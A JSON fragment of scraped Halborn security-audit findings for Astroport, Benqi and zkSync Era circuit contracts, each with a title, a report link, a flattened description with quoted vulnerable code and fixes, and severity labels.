        "body": "Some governance operations on the astroport-generator and astroport -maker contracts require current contract owner signature. Since neither contract implements a governance address transfer function it is impossible to assign a new owner in case the current account is compromised. Code Location: Listing 16: tokenomics/generator/src/contract.rs (Lines 45) 28 #[ cfg_attr ( not ( feature = \" library \") , entry_point ) ] 29 pub fn instantiate ( 30 31 32 33 34 ) -> Result < Response , ContractError > { 35 deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let mut allowed_reward_proxies : Vec < Addr > = vec! []; for proxy in msg . allowed_reward_proxies { allowed_reward_proxies . push ( deps . api . addr_validate (& proxy ) ?) ; } let config = Config { astro_token : deps . api . addr_validate (& msg . astro_token )? , tokens_per_block : msg . tokens_per_block , total_alloc_point : Uint64 :: from (0 u64 ) , owner : info . sender , 36 37 38 39 40 41 42 43 44 45 46 38 Listing 17: tokenomics/maker/src/contract.rs (Lines 45) 35 let governance_percent = if let Some ( governance_percent ) = msg . governance_percent { 36 37 38 39 40 41 42 43 44 45 46 if governance_percent > Uint64 :: new (100) { return Err ( ContractError :: IncorrectGovernancePercent {}) ; }; governance_percent } else { Uint64 :: zero () }; let cfg = Config { owner : info . sender , astro_token_contract : deps . api . addr_validate (& msg . astro_token_contract )? , Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement governance functions updating the owner addresses in case the current ones are compromised. Remediation plan: SOLVED: The issue was fixed in commit bdf6f59e4270303e818b031b619345dfa8d6d19e. 39 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISCALCULATION OF REVERSE SIMULATION IN STABLE PAIRS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "make users reverse When pairs, simulation compute_offer_amount function in contracts/pair_stable/src/contract.rs calls calc_amount function with an incorrect ask_amount parameter, i.e.: with commission already deducted. As a consequence, values returned in reverse simulation queries will always be lesser than real ones. queries stable in Code Location: Listing 18: contracts/pair_stable/src/contract.rs (Lines 860) 853 let greater_precision = offer_precision . max ( ask_precision ); 854 let offer_pool = adjust_precision ( offer_pool , offer_precision , greater_precision ) ?; 855 let ask_pool = adjust_precision ( ask_pool , ask_precision , greater_precision ) ?; 856 let ask_amount = adjust_precision ( ask_amount , ask_precision , greater_precision ) ?; 857 858 let offer_amount = adjust_precision ( 859 860 Uint128 :: new ( calc_amount ( ask_pool . u128 () , offer_pool . u128 () , ask_amount . u128 () , amp ). unwrap () , 861 862 863 864 ) ?; ) , greater_precision , offer_precision , Risk Level: Likelihood - 5 Impact - 1 40 Recommendations: Update the logic of compute_offer_amount function to call calc_amount function with ask_amount parameter without commission deducted. Remediation plan: SOLVED: The issue was fixed in commit 06728064a0eeda2b47dd1f8b1dbe0e975a700ecc. The Astroport team also discovered this security issue while security audit was in progress and solved it timely. 41 3.10 (HAL-10) ADDRESS VALIDATION MISSING - LOW ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING PAYMENT AMOUNT CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The BENQI Finance protocol includes some financial functions such as borrow, liquidate, transfer, etc. Attackers could use these functions Other with large amounts in Flash-Loan or similar financial attacks. DeFi platforms (The DAO, Spartan, and others) were hacked, and attackers stole a significant amount of funds. We observed during the test that there are no restrictions on large transfers. Code Location: Comptroller.sol Lines #330-363 Figure 1: Missing Payment Amount Check - Comptroller 15 Comptroller.sol Lines #463-493 Figure 2: Missing Payment Amount Check - Comptroller Comptroller.sol Lines #595-612 Figure 3: Missing Payment Amount Check - Comptroller Recommendation: It is recommended to implement a mechanism which controls payment amount. 16 Remediation Plan: Accepted Risk: transactions. It was not considered appropriate to limit users in 17 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "A few contracts in the BENQI project are missing a safety check inside the constructors. The address-type parameter setter should include a zero-address test; otherwise, the contracts functionality may become inaccessible or tokens burnt forever. Code Location: Timelock.sol Figure 4: Missing Address Validation - Timelock Reservoir.sol Figure 5: Missing Address Validation - Reservoir 18 Benqi.sol Figure 6: Missing Address Validation - Benqi Risk Level: Likelihood - 2 Impact - 2 19 Recommendation: It would be safer to perform additional validation before assigning Usage of a whitelist method or a user-supplied values on contracts. modifier could solve the issue. For example: Listing 1 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract address \" ); _; } Remediation Plan: Solved: BENQI Finance team implemented necessary controls on the address checks. 20 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "contracts Timelock.sol, Comptroller.sol, ComptrollerG1.sol, The Reservoir.sol and GovernorAlpha.sol use block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Timelock.sol Figure 7: Usage of block.timestamp - Timelock Comptroller.sol Figure 8: Usage of block.timestamp - Comptroller 21 Reservoir.sol Figure 9: Usage of block.timestamp - Reservoir GovernorAlpha.sol Figure 10: Usage of block.timestamp - GovernorAlpha Risk Level: Likelihood - 1 Impact - 3 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. Remediation Plan: Not Applicable: The timestamp keyword has been used intentionally. It is not necessary to change the contract given the risk. The consensus protocols of the Avalanche chain will prevent this attack. 22 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the Benqi contracts use pragma version 0.5.16. The latest pragma version is (0.8.3) was released in April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Code Location: QiToken.sol Line #1 Figure 11: Pragma Version - QiToken Risk Level: Likelihood - 1 Impact - 3 23 Recommendation: In the Solidity Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json Remediation Plan: Solved: The BENQI Finance team fixed this issue by setting the pragma version to 0.5.17 which is one of the stable releases. 24 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF INLINE ASSEMBLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Inline assembly is a way to access the Virtual Machine at a low level. This discards several important safety features in Solidity. Benqi.sol Line #297 QiErc20.sol Lines #158-170 QiErc20Delegator.sol Lines #449-453 27 Unitroller.sol Lines #139-146 Risk Level: Likelihood - 1 Impact - 3 Recommendation: The contracts should avoid using inline assembly because it interacts with the AVM (Avalanche Virtual Machine) at a low level. An attacker could bypass many essential safety features of Solidity. Remediation Plan: Accepted Risk: The contracts require inline assembly, and the risk is acceptable. 28 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Low"
        ]
    },
    {
        "title": "INCORRECT DIVISION ON WHITEPAPER INTEREST RATE MODEL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the WhitePaperInterestRateModel.sol contract, there is an incorrect division operation. According to comments in the contract, the interest rate is raised by 1e18. Some functions multiply user-controlled values by 1e18. However, the constructor doesnt have this multiplication operation. The timestampsPerYear variable is defined as 31536000.When the contract is deployed, to set 200 as the baseRatePerTimestamp variable, the deployer must use 200 * 31536000 for the baseRatePerYear variable. If the deployer sets the baseRatePerYear variable to 200, then the contract will execute the following code to calculate baseRatePerTimestamp variable: Listing 2 1 1. baseRatePerTimestamp = baseRatePerYear . div ( timestampsPerYear ); 2 2. baseRatePerTimestamp = 200. div (31536000) ; 3 3. baseRatePerTimestamp = 0 29 Code Location: WhitePaperInterestRateModel.sol Line #19-41 Figure 12: Incorrect Division on Interest Rate Model Risk Level: Likelihood - 2 Impact - 1 Recommendation: Multiply the baseRatePerYear and multiplierPerYear variables as a mantissa value raised by 1e18 power before division. Otherwise, the result will be zero. Remediation Plan: Solved: multiplication and division operations to the related functions. The BENQI Finance team solved this issue by adding new 30 ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF INPUT VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Benqi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the GovernorAlpha.sol contract, The description parameter can be left empty by the function. Code Location: GovernanceAlpha.sol Line #142 Figure 13: Lack Of Input Validation Risk Level: Likelihood - 1 Impact - 1 Recommendation: The contract should implement validation on the user controlled inputs which should be performed using a require statement. 31 Remediation Plan: Solved: The BENQI Finance team fixed this issue by implementing input validation to the contract. 32 3.9 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "Benqi",
            "Severity: Informational"
        ]
    },
    {
        "title": "CIRCUIT NOT PROPERLY WORKING WHEN USING SHARD ID > 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf",
        "body": "The STORAGE QUERIES FILTER circuit (storage_validity_by_grand_product) does not produce the intended output when shard ID is greater than 0. When the keys of each element of the initial queue are being packed throughout the sorting of the queues, the second linear combination is wrongly created, overlapping the bits of the address variable, due to using the incorrect coefficient. The problem with this bug, is that as the pack_key function is returning an incorrect packed key to the sorting functionality, the final sorted queue of the circuit is not being properly generated, leading to even more issues afterward. This can be seen as a completeness bug. Code Location: Listing 1: storage_validity_by_grand_product/mod.rs (Line 425) 419 const PACKED_WIDTHS : [ usize ; 2] = [192 , 232]; 420 // now resolve a logic 421 for ( item , is_trivial ) in it { 422 423 424 425 426 427 let packed_key = pack_key ( // check if keys are equal and check a value let TimestampedStorageLogRecord { record , timestamp } = item ; cs , ( record . shard_id . clone () , record . address . clone () , record .  key ) , 428 429 430 431 432 ) ?; // ensure sorting let ( keys_are_equal , previous_key_is_greater ) = prepacked_long_comparison ( cs , & previous_packed_key , &  packed_key , & PACKED_WIDTHS ) ?; 15 433 434 can_not_be_false_if_flagged ( cs , & previous_key_is_greater . not ()  , & is_trivial . not () ) ?; 435 436 437 // if keys are the same then timestamps are sorted let (_ , previous_timestamp_is_less ) = previous_timestamp . sub (  cs , & timestamp ) ?; 438 439 // enforce if keys are the same and not trivial let must_enforce = smart_and (cs , &[ keys_are_equal , is_trivial .  not () ]) ?; 440 can_not_be_false_if_flagged ( cs , & previous_timestamp_is_less , &  must_enforce ) ?; 441 442 443 // we follow the procedure : // if keys are different then we finish with a previous one  and update parameters 444 // else we just update parameters Listing 2: storage_validity_by_grand_product/mod.rs (Line 669) let shifts = compute_shifts :: < E :: Fr >() ; cs : & mut CS , key_tuple : ( Byte <E >, UInt160 <E >, UInt256 <E >) , 650 pub fn pack_key <E : Engine , CS : ConstraintSystem <E > >( 651 652 653 ) -> Result <[ Num <E >; 2] , SynthesisError > { 654 655 656 657 658 659 660 let ( shard_id , address , key ) = key_tuple ; let mut lc_0 = LinearCombination :: zero () ; lc_0 . add_assign_number_with_coeff (& key . inner [0]. inner , shifts // LE packing  [0]) ; 661 lc_0 . add_assign_number_with_coeff (& key . inner [1]. inner , shifts  [64]) ; 662 lc_0 . add_assign_number_with_coeff (& key . inner [2]. inner , shifts  [128]) ; 663 664 665 666 667 // 192 in total let value_0 = lc_0 . into_num ( cs ) ?; let mut lc_1 = LinearCombination :: zero () ; lc_1 . add_assign_number_with_coeff (& key . inner [3]. inner , shifts  [0]) ; 668 669 lc_1 . add_assign_number_with_coeff (& address . inner , shifts [64]) ; lc_1 . add_assign_number_with_coeff (& shard_id . inner , shifts 16  [160]) ; 670 671 672 673 674 } let value_1 = lc_1 . into_num ( cs ) ?; // 64 + 160 + 8 = 232 in total Ok ([ value_0 , value_1 ]) Proof of Concept: 1. The STORAGE QUERIES FILTER circuit receives as input witness the storage access requests queue. 2. This circuit aims to order the resulting queue of all the elements in the initial queue by a generated key. 3. The circuit calls the pack_key function to generate the key for the current element of the queue. 4. A shard_id different from 0 is being used. 5. Within the generated key, the bits of the address parameter gets overlapped with the bits of the shard_id. 6. An incorrect key is returned to the main function of the circuit, thus breaking the overall functionality of the circuit. 7. The resulting queue is not ordered as expected, leading to even more issues afterward. Risk Level: Likelihood - 5 Impact - 5 17 Recommendation: The last coefficient on line 669 needs to be shifts[224] instead of shifts[160]. Listing 3: storage_validity_by_grand_product/mod.rs (Line 669) 666 let mut lc_1 = LinearCombination :: zero () ; 667 lc_1 . add_assign_number_with_coeff (& key . inner [3]. inner , shifts [0]) ; 668 lc_1 . add_assign_number_with_coeff (& address . inner , shifts [64]) ; 669 lc_1 . add_assign_number_with_coeff (& shard_id . inner , shifts [224]) ; 670 let value_1 = lc_1 . into_num ( cs ) ?; Moreover, would be useful to check after each linear combination if the shift value is within the capacity by using: Listing 4: storage_validity_by_grand_product/mod.rs 0 assert! ( shift <= E :: Fr :: CAPACITY as usize ); Remediation Plan: SOLVED: The MatterLabs team solved the issue by fixing the offset and adding assertion. Commit ID : 5109e0768c7de799f87ec67bf40b6a544cca4e4e 18 ",
        "labels": [
            "Halborn",
            "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge",
            "Severity: Critical"
        ]
    },
    {
        "title": "HEAD STATE NOT ENFORCED TO BE ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf",
        "body": "The MESSAGES EVENTS FILTER circuit (log_sorter) is not enforcing the head state of the initial queue received as input to be zero. Even though the LOG DEMULTIPLEXER circuit gives as output all queues that were initially empty, already enforcing the head state to be zero, it is essential to ensure it is atomically checked in each circuit, regardless of where the input is coming from. Code Location: Listing 5: log_sorter/mod.rs project_ref! ( witness , intermediate_sorted_queue_state ). cloned 49 let structured_input_witness = project_ref! ( witness ,  closed_form_input ). cloned () ; 50 let initial_queue_witness = project_ref! ( witness ,  initial_queue_witness ). cloned () ; 51 let intermediate_sorted_queue_state = 52  () ; 53 let sorted_queue_witness = project_ref! ( witness ,  sorted_queue_witness ). cloned () ; 54 55 let mut structured_input = EventsDeduplicatorInputOutput ::  alloc_ignoring_outputs ( 56 57 58 ) ?; 59 60 Boolean :: enforce_equal ( cs , & structured_input . start_flag , & Boolean  :: constant ( true )) ?; 61 62 let mut initial_queue = StorageLogQueue :: from_raw_parts ( 63 64 65 66 cs , structured_input_witness . clone () , . observable_input . initial_log_queue_state cs , structured_input 19 . head_state , structured_input . observable_input . initial_log_queue_state . tail_state , structured_input 67 68 69 70 71 72 73 74 75 76 ) ?; 77 78 // dbg! ( initial_queue . clone () . into_state () . create_witness () ) ; 79 80 if let Some ( wit ) = initial_queue_witness { 81 82 } . observable_input . initial_log_queue_state . num_items , initial_queue . witness = wit ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Adding the enforcement for the initial queue head state to be zero right after getting it from the input witness. Listing 6: log_sorter/mod.rs (Line 79) 77 78 // it must be trivial 79 initial_queue . head_state . enforce_equal ( cs , & Num :: zero () ) ?; 80 81 // dbg! ( initial_queue . clone () . into_state () . create_witness () ) ; 82 83 if let Some ( wit ) = initial_queue_witness { 84 85 } initial_queue . witness = wit ; 20 Remediation Plan: SOLVED: The MatterLabs team solved the issue by enforcing the initial queue head state to zero. Commit ID : b0a79356613655bddccaab3b89dbf1142b5483fb 21 ",
        "labels": [
            "Halborn",
            "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED CIRCUIT FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf",
        "body": "the LOG DEMULTIPLEXER the never The demultiplex_storage_logs_inner_optimized function is used Within demultiplex_storage_logs_inner used. instead. (demux_log_queue) function declared circuit but is Code Location: Listing 7: demux_log_queue/mod.rs 144 pub fn demultiplex_storage_logs_inner < 145 146 147 E: Engine , CS : ConstraintSystem <E >, R: CircuitArithmeticRoundFunction <E , 2, 3, StateElement = Num <  E >>, 148 >( 149 150 151 152 153 ) -> Result <[ StorageLogQueue <E >; NUM_SEPARATE_QUEUES ], cs : & mut CS , mut storage_log_queue : StorageLogQueue <E >, round_function : &R , limit : usize ,  SynthesisError > { 154 155 156 assert! ( limit <= u32 :: MAX as usize ); let mut optimizer = SpongeOptimizer :: new ( round_function . clone  () , 3) ; 157 158 159 160 161 162 163 164 165 166 let mut rollup_storage_queue = StorageLogQueue :: empty () ; // let mut porter_storage_queue = StorageLogQueue :: empty () ; let mut events_queue = StorageLogQueue :: empty () ; let mut l1_messages_queue = StorageLogQueue :: empty () ; let mut keccak_calls_queue = StorageLogQueue :: empty () ; let mut sha256_calls_queue = StorageLogQueue :: empty () ; let mut ecdsa_calls_queue = StorageLogQueue :: empty () ; const SYSTEM_CONTRACTS_OFFSET_ADDRESS : u16 = 1 << 15; 22 167 168 const KECCAK256_ROUND_FUNCTION_PRECOMPILE_ADDRESS : u16 =  SYSTEM_CONTRACTS_OFFSET_ADDRESS + 0 x10 ; 169 const SHA256_ROUND_FUNCTION_PRECOMPILE_ADDRESS : u16 = 0 x02 ; //  as in Ethereum 170 const ECRECOVER_INNER_FUNCTION_PRECOMPILE_ADDRESS : u16 = 0 x01 ;  // as in Ethereum 171 172 let keccak_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 173 174 175 KECCAK256_ROUND_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); let sha256_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 176 177 178 SHA256_ROUND_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); let ecrecover_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 179 180 181 182 183 184 185 186 ECRECOVER_INNER_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); for _ in 0.. limit { let execute = storage_log_queue . is_empty ( cs ) ?. not () ; // let n = cs . get_current_step_number () ; let popped = storage_log_queue . pop_first ( cs , & execute ,  round_function ) ?; 187 188 189 190 // dbg! ( cs . get_current_step_number () - n ) ; // 291 let is_storage_aux_byte = Num :: equals (cs , & aux_byte_for_storage () . inner , & popped  . aux_byte . inner ) ?; 191 192 let is_event_aux_byte = Num :: equals (cs , & aux_byte_for_event () . inner , & popped .  aux_byte . inner ) ?; 193 194 let is_l1_message_aux_byte = Num :: equals (cs , & aux_byte_for_l1_message () . inner , &  popped . aux_byte . inner ) ?; 195 196 197 198 199 200 let is_precompile_aux_byte = Num :: equals ( cs , & aux_byte_for_precompile_call () . inner , & popped . aux_byte . inner , ) ?; 23 201 let is_keccak_address = UInt160 :: equals ( cs , &  keccak_precompile_address , & popped . address ) ?; 202 let is_sha256_address = UInt160 :: equals ( cs , &  sha256_precompile_address , & popped . address ) ?; let is_ecrecover_address = 203 204 UInt160 :: equals ( cs , & ecrecover_precompile_address , &  popped . address ) ?; 205 206 207 208 209 let is_rollup_shard = popped . shard_id . inner . is_zero ( cs ) ?; let execute_rollup_storage = smart_and ( cs , &[ is_storage_aux_byte , is_rollup_shard ,  execute ]) ?; 210 211 let execute_porter_storage = smart_and ( cs , &[ is_storage_aux_byte , is_rollup_shard .  not () , execute ]) ?; 212 Boolean :: enforce_equal ( cs , & execute_porter_storage , &  Boolean :: constant ( false )) ?; 213 let execute_event = smart_and (cs , &[ is_event_aux_byte ,  execute ]) ?; 214 let execute_l1_message = smart_and ( cs , &[  is_l1_message_aux_byte , execute ]) ?; 215 216 let execute_keccak_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_keccak_address , execute ]) ?; 217 218 let execute_sha256_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_sha256_address , execute ]) ?; 219 220 let execute_ecrecover_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_ecrecover_address , execute ]) ?; 221 222 223 224 225 226 227 228 229 230 // let n = cs . get_current_step_number () ; rollup_storage_queue . push_with_optimizer ( cs , LogType :: RollupStorage as u64 , & popped , & execute_rollup_storage , & mut optimizer , ) ?; // porter_storage_queue . push_with_optimizer (cs , LogType ::  PorterStorage as u64 , & popped , & execute_porter_storage , & mut  optimizer ) ?; 231 events_queue . push_with_optimizer ( 24 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 cs , LogType :: Events as u64 , & popped , & execute_event , & mut optimizer , ) ?; l1_messages_queue . push_with_optimizer ( cs , LogType :: L1Messages as u64 , & popped , & execute_l1_message , & mut optimizer , ) ?; keccak_calls_queue . push_with_optimizer ( cs , LogType :: KeccakCalls as u64 , & popped , & execute_keccak_call , & mut optimizer , ) ?; sha256_calls_queue . push_with_optimizer ( cs , LogType :: Sha256Calls as u64 , & popped , & execute_sha256_call , & mut optimizer , ) ?; ecdsa_calls_queue . push_with_optimizer ( cs , LogType :: ECRecoverCalls as u64 , & popped , & execute_ecrecover_call , & mut optimizer , ) ?; // dbg! ( cs . get_current_step_number () - n ) ; // 96 // let n = cs . get_current_step_number () ; optimizer . enforce ( cs ) ?; // dbg! ( cs . get_current_step_number () - n ) ; // 338 let expected_bitmask_bits = [ is_storage_aux_byte , is_event_aux_byte , is_l1_message_aux_byte , 25 276 277 278 279 280 is_precompile_aux_byte , ]; let ( is_bitmask , all_flags_are_false ) = check_if_bitmask_and_if_empty ( cs , &  expected_bitmask_bits ) ?; 281 can_not_be_false_if_flagged (cs , & is_bitmask , & Boolean ::  Constant ( true )) ?; 282 can_not_be_false_if_flagged (cs , & all_flags_are_false . not ()  , & execute ) ?; } 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 } storage_log_queue . enforce_to_be_empty ( cs ) ?; let all_queues = [ rollup_storage_queue , events_queue , l1_messages_queue , keccak_calls_queue , sha256_calls_queue , ecdsa_calls_queue , ]; Ok ( all_queues ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: Any unused code is recommended to be removed for better readability of the overall code and optimization. 26 Remediation Plan: SOLVED: The MatterLabs team solved the issue by removing the unused function. Commit ID : 06c2e76546369fb112d8ac14fb5388154857435b 27 ",
        "labels": [
            "Halborn",
            "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge",
            "Severity: Informational"
        ]
    },
    {
        "title": "QUEUE NOT ENFORCED TO BE EMPTY RIGHT AFTER POPPING ALL ELEMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf",
        "body": "The MERKLEIZER circuit (merkleize_l1_messages) does not enforce the ini- tial queue to be empty right after popping all elements. Even though it does it at the end of the circuit, as this circuit is resource-consuming while computing the linear hash and the Merkle tree hash, it would be useful to enforce it before all the hashing functionality for better readability of the overall code and optimization. Code Location: Listing 8: merkleize_l1_messages/merkleize.rs (Line 244) 204 for chunk in linear_hash_input [4..]. chunks_exact_mut (  MESSAGE_SERIALIZATION_BYTES ) { 205 206 let can_pop = initial_queue . is_empty ( cs ) ?. not () ; let item = initial_queue . pop_first ( cs , & can_pop ,  round_function ) ?; let serialized = item . serialize ( cs ) ?; assert_eq! ( chunk . len () , serialized . len () ); for ( dst , src ) in chunk . iter_mut () . zip ( serialized . iter () ) { * dst = Byte :: conditionally_select ( cs , & can_pop , src , dst ) 207 208 209 210  ?; } 211 212 } 213 214 let linear_hash = if output_linear_hash { 215 216 217 218 219 220 \" Computing linear hash over {} bytes \" , linear_hash_input . len () println! ( ); let pubdata_hash = tree_hasher . hash ( cs , & linear_hash_input ) ?; let pubdata_hash_as_bytes32 = Bytes32 :: from_bytes_array (&  pubdata_hash ); 221 28 pubdata_hash_as_bytes32 222 223 } else { 224 225 }; 226 227 // a little bit tricky : unsafe cast , but we checked the length , Bytes32 :: empty ()  and ABI wise it 's guaranteed 228 // later on we can use split_array_ref 229 230 let leafs_only_bytes = & linear_hash_input [4..]; 231 assert! ( leafs_only_bytes . len () % MESSAGE_SERIALIZATION_BYTES == 0)  ; 232 233 let mut leafs = vec! []; 234 for chunk in leafs_only_bytes . chunks_exact (  MESSAGE_SERIALIZATION_BYTES ) { 235 let leaf_encoding : [ _ ; MESSAGE_SERIALIZATION_BYTES ] = chunk .  to_vec () . try_into () . unwrap () ; leafs . push ( leaf_encoding ); 236 237 } 238 239 println! ( \" Computing tree over {} leafs \" , leafs . len () ); 240 241 let calculated_merkle_root = 242 circuit_compute_merkle_root_from_leafs_generic :: <_ , _ , H ,  ARITY >( cs , & leafs , tree_hasher ) ?; 243 244 initial_queue . enforce_to_be_empty ( cs ) ?; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Enforce the initial queue to be empty right after popping all elements for better readability of the overall code and optimization. 29 Remediation Plan: ACKNOWLEDGED: The MatterLabs team acknowledged this issue. It will be addressed while moving to the new proof system. 30 ",
        "labels": [
            "Halborn",
            "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf",
        "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: 134: for (uint256 i = 0; i < public_inputs.length; i = i. Verifier.sol Line - uncheckedInc()){ - Line 139: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 164: for (uint256 i = 0; i < proof.quotient_poly_parts_commitments .length; i = i.uncheckedInc()){ - Line 172: length; i = i.uncheckedInc()){ - Line 178: for (uint256 i = 0; i < proof.state_polys_openings_at_z_omega .length; i = i.uncheckedInc()){ - Line 183: for (uint256 i = 0; i < proof.gate_selectors_openings_at_z. length; i = i.uncheckedInc()){ - Line 188: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ for (uint256 i = 0; i < proof.state_polys_openings_at_z. Plonk4VerifierWithAccessToDNext.sol - Line 144: for (uint256 i = 0; i < vk.num_inputs; i = i.uncheckedInc() ){ - Line 148: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 164: for (uint256 i = 0; i < proof.quotient_poly_parts_commitments .length; i = i.uncheckedInc()){ - Line 171: length; i = i.uncheckedInc()){ - Line 175: for (uint256 i = 0; i < proof.state_polys_openings_at_z_omega for (uint256 i = 0; i < proof.state_polys_openings_at_z. 31 .length; i = i.uncheckedInc()){ - Line 178: for (uint256 i = 0; i < proof.gate_selectors_openings_at_z. length; i = i.uncheckedInc()){ - Line 181: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ - Line 301: for (uint256 i = 0; i < lagrange_poly_numbers.length; i = i .uncheckedInc()){ - Line 307: for (uint256 i = 0; i < vk.num_inputs; i = i.uncheckedInc() ){ - Line 324: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ - Line 448: length; ){ - Line 472: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ - Line 558: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ - Line 613: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 622: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ for (uint256 i = 0; i < proof.state_polys_openings_at_z. PairingsBn254.sol - Line 240: for (uint256 i = 0; i < elements; ){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended not to initialize uint256 variables to 0 to reduce the gas costs. For example, use instead: for (uint256 i; i < length; ++i){ 32 Remediation Plan: ACKNOWLEDGED: The MatterLabs team 